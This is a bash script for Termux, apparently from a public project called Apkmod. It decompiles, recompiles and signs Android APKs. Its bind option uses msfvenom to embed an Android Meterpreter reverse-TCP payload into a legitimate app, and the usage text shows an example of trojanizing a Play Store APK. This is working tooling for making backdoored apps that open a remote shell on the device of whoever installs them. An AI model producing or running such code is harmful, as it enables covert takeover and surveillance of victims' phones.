#!/data/data/com.termux/files/usr/bin/bash

########################################
# Project : Apkmod     		       #
# Author  : Lokesh @Hax4us	       #
# Email   : lkpandey950@gmail.com      #
########################################

CWD=$(pwd)
VERSION="1.0"

#colors
cyan='\033[1;36m'                       
green='\033[1;32m'                      
red='\033[1;31m'                        
yellow='\033[1;33m'                     
blue='\033[1;34m'                       
purple='\033[1;35m'
reset='\033[0m'

usage() {
	printf "${yellow}Usage: apkmod [option] [EXTRAARGS] [/path/to/input.apk] [/path/to/output.apk]\n${purple}valid options are:${blue}\n  -v		print version\n  -d		For decompiling\n  -r		For recompiling\n  -s		For signing\n  -b		For binding payload\n${yellow}Example:\n  ${blue}apkmod -b 127.0.0.1 4444 /sdcard/apps/play.apk /sdcard/apps/binded_play.apk  ${purple}bind the payload with play.apk and saves output in given directory.\n${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
}

error_msg() {
	printf "${red}[!] ${yellow}${1}${reset}\n"
}

print_status() {
	printf "${blue}[*] ${green}${1}\n${reset}"
}

file_exist() {
	if [ ! -e "${1}" ]; then
		error_msg "file (${1}) does not exist"
		exit 1
	fi
}

dir_exist() {
	if [ ! -d "${1}" ]; then
		error_msg "directory (${1}) does not exist"
		exit 1
	fi
}

decompile() {
	print_status "Decompiling ${1}"
	apktool d -f ${1} -o ${2}
	print_status "Decompiled into ${2}"
}

recompile() {
	print_status "Recompiling ${1}"
	apktool b -a /usr/bin/aapt -o ${2} ${1}
	print_status "Recompiled to ${2}"
}

signapk() {
	print_status "Signing ${1}"
	apksigner -p android keystore ${1} ${2}
	print_status "Signed to ${2}"
}

bindapk() {
	print_status "Binding ${3}"
	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
	if [ ! -e ${4} ]; then
		error_msg "Can't bind, take screenshot and open a issue on github"
		exit 1
	fi
	print_status "Binded to ${4}"
}


validate_input() {
	if [ "${1}" = "-b" ]; then
		if [ "$#" -ne 5 ]; then
			usage
			exit 1
		fi
		LHOST=${2}
		LPORT=${3}
		file_exist "${4}"
		dir_exist "${5%\/*}"
	fi
	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
		usage
		exit 1
	fi

	if [ "${1}" = "-d" -o "${1}" = "-s" ]; then
		file_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ "${1}" = "-r" ]; then
		dir_exist "${2}"
		dir_exist "${3%\/*}"
	fi
}

if [ "${1}" = "-h" -o "${1}" = "" ]; then
	usage
	exit 1
elif [ "${1}" = "-v" ]; then
	printf "${yellow}${VERSION}\n${reset}"
fi

if [ "${1}" = "-d" -o "${1}" = "-r" -o "${1}" = "-s" ]; then
	in_abs_path=$(readlink -f ${2})
	out_abs_path=$(readlink -f ${3})
fi

if [ "${1}" = "-d" ]; then
	validate_input -d ${in_abs_path} ${out_abs_path}
	decompile ${in_abs_path} ${out_abs_path}
elif [ "${1}" = "-r" ]; then
	validate_input -r ${in_abs_path} ${out_abs_path}
	recompile ${in_abs_path} ${out_abs_path}
elif [ "${1}" = "-s" ]; then
	validate_input -s ${in_abs_path} ${out_abs_path}
	signapk ${2} ${3}
elif [ "${1}" = "-b" ]; then
	in_abs_path=$(readlink -f ${4})
	out_abs_path=$(readlink -f ${5})
	validate_input -b ${2} ${3} ${in_abs_path} ${out_abs_path}
	bindapk ${2} ${3} ${in_abs_path} ${out_abs_path}
else
	error_msg "Invalid input"
fi

